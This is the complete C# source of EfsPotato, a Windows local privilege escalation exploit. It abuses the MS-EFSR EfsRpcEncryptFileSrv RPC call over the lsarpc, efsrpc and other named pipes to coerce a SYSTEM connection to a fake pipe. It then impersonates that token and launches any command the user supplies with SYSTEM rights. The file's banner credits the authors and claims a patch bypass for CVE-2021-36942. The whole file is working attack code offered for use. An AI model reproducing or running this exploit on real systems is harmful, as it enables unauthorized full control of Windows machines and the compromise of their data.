using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Security.Permissions;
using System.Diagnostics;
using System.Threading;
using System.Security.Principal;
using System.Linq;
using Microsoft.Win32.SafeHandles;

namespace Zcg.Exploits.Local
{
    class EfsPotato
    {
        static void usage()
        {
            Console.WriteLine("usage: EfsPotato <cmd> [pipe]");
            Console.WriteLine("  pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)\r\n");
        }
        static void Main(string[] args)
        {
            Console.WriteLine("Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).");
            Console.WriteLine("Part of GMH's fuck Tools, Code By zcgonvh.");
            Console.WriteLine("CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]\r\n");
            if (args.Length < 1)
            {
                usage();
                return;
            }
            string pipe = "lsarpc";
            if (args.Length >= 2)
            {
                if ((new List<string> { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" }).Contains(args[1], StringComparer.OrdinalIgnoreCase))
                {
                    pipe = args[1];
                }
                else
                {
                    usage();
                    return;
                }
            }

            LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                Console.WriteLine("[+] Current user: " + wi.Name);
                LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges = l;
                l[0].Attributes = 2;
                if (!AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                {
                    Console.WriteLine("[x] SeImpersonatePrivilege not held.");
                    return;
                }
            }
            string g = Guid.NewGuid().ToString("d");
            string fake = @"\\.\pipe\" + g + @"\pipe\srvsvc";
            var hPipe = CreateNamedPipe(fake, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
            if (hPipe == new IntPtr(-1))
            {
                Console.WriteLine("[x] can not create pipe: " + new Win32Exception(Marshal.GetLastWin32Error()).Message);
                return;
            }
            ManualResetEvent mre = new ManualResetEvent(false);
            var tn = new Thread(NamedPipeThread);
            tn.IsBackground = true;
            tn.Start(new object[] { hPipe, mre });
            var tn2 = new Thread(RpcThread);
            tn2.IsBackground = true;
            tn2.Start(new object[] { g, pipe });
            if (mre.WaitOne(3000))
            {
                if (ImpersonateNamedPipeClient(hPipe))
                {
                    IntPtr tkn = WindowsIdentity.GetCurrent().Token;
                    Console.WriteLine("[+] Get Token: " + tkn);
                    SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                    sa.nLength = Marshal.SizeOf(sa);
                    sa.pSecurityDescriptor = IntPtr.Zero;
                    sa.bInheritHandle = 1;
                    IntPtr hRead, hWrite;
                    CreatePipe(out hRead, out hWrite, ref sa, 1024);
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.hStdError = hWrite;
                    si.hStdOutput = hWrite;
                    si.lpDesktop = "WinSta0\\Default";
                    si.dwFlags = 0x101;
                    si.wShowWindow = 0;
                    if (CreateProcessAsUser(tkn, null, args[0], IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                    {
                        Console.WriteLine("[!] process with pid: {0} created.\r\n==============================", pi.dwProcessId);
                        tn = new Thread(ReadThread);
                        tn.IsBackground = true;
                        tn.Start(hRead);
                        new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                        tn.Abort();
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                        CloseHandle(tkn);
                        CloseHandle(hWrite);
                        CloseHandle(hRead);
                    }
                }
            }
            else
            {
                Console.WriteLine("[x] operation timed out.");
                CreateFile(fake, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);//force cancel async operation
            }
            CloseHandle(hPipe);
        }
        static void ReadThread(object o)
        {
            IntPtr p = (IntPtr)o;
            FileStream fs = new FileStream(p, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
                Console.WriteLine(s);
            }
        }
        static void RpcThread(object o)
        {
            object[] objs = o as object[];
            string g = objs[0] as string;
            string p = objs[1] as string;
            EfsrTiny r = new EfsrTiny(p);
            try
            {
                r.EfsRpcEncryptFileSrv("\\\\localhost/PIPE/" + g + "/\\" + g + "\\" + g);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

        static void NamedPipeThread(object o)
        {
            object[] objs = o as object[];
            IntPtr pipe = (IntPtr)objs[0];
            ManualResetEvent mre = objs[1] as ManualResetEvent;
            if (mre != null)
            {
                ConnectNamedPipe(pipe, IntPtr.Zero);
                mre.Set();
            }
        }
        #region pinvoke
        //just copy-paste from stackoverflow,pinvoke.net,etc
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern IntPtr ConnectNamedPipe(IntPtr pipe, IntPtr zero);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
        public static extern bool CloseHandle(IntPtr handle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public UInt32 Attributes;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr pSecurityDescriptor;
            public int bInheritHandle;
        }
        #endregion
    }
    //copy from bcl
    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    //this code just copy-paste from gist
    //orig class: rprn
    //some changed for MS-EFSR
    class EfsrTiny
    {
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFree(ref IntPtr lpString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
        private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);

        private static byte[] MIDL_ProcFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00 };

        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };

        private static byte[] MIDL_TypeFormatStringx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };

        private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
        Guid interfaceId;
        public EfsrTiny(string pipe)
        {
            IDictionary<string, string> bindingMapping = new Dictionary<string, string>()
            {
                {"lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d"},
                {"samr", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e"}
            };

            interfaceId = new Guid(bindingMapping[pipe]);

            pipe = String.Format("\\pipe\\{0}", pipe);
            Console.WriteLine("[+] Pipe: " + pipe);
            if (IntPtr.Size == 8)
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, pipe, 1, 0);
            }
            else
            {
                InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, pipe, 1, 0);
            }
        }

        ~EfsrTiny()
        {
            freeStub();
        }
        public int EfsRpcEncryptFileSrv(string FileName)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

            try
            {
                if (IntPtr.Size == 8)
                {
                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
                }
                else
                {
                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
                }
            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Console.WriteLine("[x] EfsRpcEncryptFileSrv failed: " + err);
                return err;
            }
            finally
            {
                if (pfn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pfn);
            }
            return (int)result.ToInt64();
        }
        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;

        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }


        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);

        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        delegate void freememory(IntPtr memory);

        protected static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }


        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;
            status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcStringBindingCompose failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingFromStringBinding failed with status 0x" + status.ToString("x"));
                return IntPtr.Zero;
            }

            status = RpcBindingSetAuthInfo(binding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, 16);
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingSetAuthInfo failed with status 0x" + status.ToString("x"));
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
                Console.WriteLine("[x] RpcBindingSetOption failed with status 0x" + status.ToString("x"));
            }
            Console.WriteLine("[!] binding ok (handle=" + binding.ToString("x") + ")");
            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
        }

        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {

            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    struct COMM_FAULT_OFFSETS
    {
        public short CommOffset;
        public short FaultOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
        public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            MajorVersion = InterfaceVersionMajor;
            MinorVersion = InterfaceVersionMinor;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER
    {
        public Guid SyntaxGUID;
        public RPC_VERSION SyntaxVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;

        public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

        public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
            RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
            InterfaceId = new RPC_SYNTAX_IDENTIFIER();
            InterfaceId.SyntaxGUID = iid;
            InterfaceId.SyntaxVersion = rpcVersion;
            rpcVersion = new RPC_VERSION(2, 0);
            TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
            TransferSyntax.SyntaxGUID = IID_SYNTAX;
            TransferSyntax.SyntaxVersion = rpcVersion;
            DispatchTable = IntPtr.Zero;
            RpcProtseqEndpointCount = 0u;
            RpcProtseqEndpoint = IntPtr.Zero;
            Reserved = IntPtr.Zero;
            InterpreterInfo = IntPtr.Zero;
            Flags = 0u;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct MIDL_STUB_DESC
    {
        public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
        public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
        public IntPtr /*EXPR_EVAL*/ apfnExprEval;
        public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        /* Ndr library version. */
        public uint Version;
        public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        // New fields for version 3.0+
        public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
        // Notify routines - added for NT5, MIDL 5.0
        public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
        public IntPtr mFlags;
        // International support routines - added for 64bit post NT5
        public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
        // Fields up to now present in win2000 release.

        public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
        {
            pFormatTypes = pFormatTypesPtr;
            RpcInterfaceInformation = RpcInterfaceInformationPtr;
            CommFaultOffsets = IntPtr.Zero;
            pfnAllocate = pfnAllocatePtr;
            pfnFree = pfnFreePtr;
            pAutoBindHandle = IntPtr.Zero;
            apfnNdrRundownRoutines = IntPtr.Zero;
            aGenericBindingRoutinePairs = IntPtr.Zero;
            apfnExprEval = IntPtr.Zero;
            aXmitQuintuple = IntPtr.Zero;
            fCheckBounds = 1;
            Version = 0x50002u;
            pMallocFreeStruct = IntPtr.Zero;
            MIDLVersion = 0x801026e;
            aUserMarshalQuadruple = IntPtr.Zero;
            NotifyRoutineTable = IntPtr.Zero;
            mFlags = new IntPtr(0x00000001);
            CsRoutineTables = IntPtr.Zero;
            ProxyServerInfo = IntPtr.Zero;
            pExprInfo = IntPtr.Zero;
        }
    }

}
